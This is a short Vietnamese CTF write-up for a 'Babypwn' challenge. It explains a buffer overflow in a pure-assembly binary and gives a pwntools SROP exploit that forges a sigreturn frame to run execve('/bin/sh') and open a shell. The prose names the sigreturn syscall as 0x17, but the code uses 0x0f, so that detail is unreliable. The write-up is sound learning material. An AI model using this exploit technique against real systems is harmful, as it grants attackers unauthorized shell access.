# Babypwn

## Code analysis

![code](code.png)

Chương trình được viết bằng asm thuần, cho phép nhập vào 0x100 kí tự bắt đầu từ `[rsp-18h]` tức là ta có thể ghi đè giá trị lưu ở `[rsp - 8]`. Ở cuối chương trình có move `[rsp - 8]` vào `rax` và gọi `syscall` nên ta có thể thay đổi giá trị của `rax` để thực thi syscall khác. Chương trình cũng có sẵn string `/bin/sh`. Vậy ta thay đổi giá trị của `[rsp - 8]` thành `0x17` để thực thi syscall `SIGRETURN` để set giá trị của các thanh ghi sau đó gọi syscall `execve` để thực thi `/bin/sh`.

## Exploit

```python
p = start()

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = 0x400155           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = 0x0400136       # address of syscall instruction

payload = b'a' * 16
payload += p64(0x0f)
payload += bytes(frame)

p.sendafter(b' data:\n',payload)

p.interactive()
```
